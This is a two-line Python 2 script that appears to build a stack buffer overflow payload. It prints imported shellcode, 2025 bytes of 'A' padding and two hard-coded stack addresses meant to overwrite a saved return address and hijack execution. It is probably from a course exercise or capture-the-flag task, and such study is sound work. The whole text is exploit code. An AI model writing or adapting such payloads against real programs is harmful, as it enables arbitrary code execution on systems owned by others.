from shellcode import shellcode
print shellcode + "\x41" * 2025 + "\x28\x99\xfe\xbf" + "\x3c\xa1\xfe\xbf"
